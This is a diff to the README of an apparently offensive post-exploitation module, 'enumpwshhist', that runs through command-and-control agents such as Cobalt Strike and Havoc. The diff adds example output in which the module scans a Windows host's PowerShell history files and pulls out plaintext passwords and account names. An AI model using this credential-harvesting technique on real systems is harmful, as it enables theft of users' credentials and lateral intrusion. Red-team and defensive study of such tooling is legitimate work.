@@ -12,6 +12,36 @@ The behaviour is the same as the [Powershell History netexec SMB Module](https:/
 enumpwshhist
 ```
 
+### Example output
+
+```
+22/01/2025 15:56:46 [danielward] Demon » enumpwshhist
+[*] [5E924F7B] Enumerating powershell history for all reachable directories
+[+] Send Task to Agent [31 bytes]
+[+] Received Output [42 bytes]:
+[+] Enumerating powershell history files!
+
+[+] Received Output [736 bytes]:
+Evaluating directory: C:\Users\lo\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+	File found: ConsoleHost_history.txt
+	Full path: C:\Users\lo\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+	[convertto-securestring]: $creds = convertto-securestring 'helloworld123' -asplaintext -force
+
+	[credential]: $uo = new-object system.manageement.automation.pscredential ('micael.jackson', $creds)
+
+	[credential]: $uo = new-object system.manageement.automation.pscredential ('michael.jackson', $creds)
+
+	[credential]: $uo = new-object system.management.automation.pscredential ('michael.jackson', $creds)
+
+	[convertto-securestring]: $creds = convertto-securestring 'h123elloworld123' -asplaintext -force
+
+
+[+] Received Output [42 bytes]:
+[+] Finished powershell file enumeration!
+
+[*] BOF execution completed
+```
+
 ## Supported C2s
 
 - CobaltStrike : load `enumpwshhist.cna`
